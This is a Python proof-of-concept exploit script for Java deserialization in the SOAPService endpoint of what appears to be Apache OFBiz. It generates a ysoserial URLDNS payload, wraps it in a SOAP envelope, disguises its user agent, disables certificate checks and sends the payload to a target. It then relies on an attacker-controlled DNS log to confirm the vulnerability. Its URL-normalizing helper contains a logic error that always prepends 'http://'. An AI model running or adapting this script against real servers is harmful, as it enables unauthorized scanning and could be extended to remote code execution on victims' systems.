import binascii
import subprocess
import sys
import requests
from fake_useragent import UserAgent
from urllib3.exceptions import InsecureRequestWarning

def check_url(url):
    if not url.startswith('http://') or not url.startswith('https://'):
        url = 'http://'+url
    if url.endswith('/'):
        url = url[:-1]
    return url

def poc(url,dnslog):
    dnslog = check_url(dnslog)
    url = check_url(url)
    popen = subprocess.Popen(['java','-jar','ysoserial.jar','URLDNS',dnslog],stdout=subprocess.PIPE)
    payload = popen.stdout.read()
    hex_data = binascii.hexlify(payload)

    headers = {
        'Content-Type': 'text/xml',
        'User-Agent': UserAgent().chrome
    }
    post_data = '''
        <soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/"> 
            <soapenv:Header/>
            <soapenv:Body>
            <ser>
                <map-HashMap>
                    <map-Entry>
                        <map-Key>
                            <cus-obj>{0}</cus-obj>
                        </map-Key>
                        <map-Value>
                            <std-String value="{1}"/>
                        </map-Value>
                    </map-Entry>
                </map-HashMap>
            </ser>
            </soapenv:Body>
        </soapenv:Envelope>
    '''.format(hex_data, dnslog)
    requests.packages.urllib3.disable_warnings(category=InsecureRequestWarning)
    target_url = url+"/webtools/control/SOAPService"
    try:
        res = requests.post(url=target_url,data=post_data,headers=headers, verify=False,timeout=5)
        if res.status_code == 200:
            print("[*] check your dnslog : "+dnslog)
        else:
            print("[-] requests error")
    except:
        print("[-] requests error ")


if __name__=='__main__':
    url = sys.argv[1]
    dnslog = sys.argv[2]
    poc(url,dnslog)

   
    














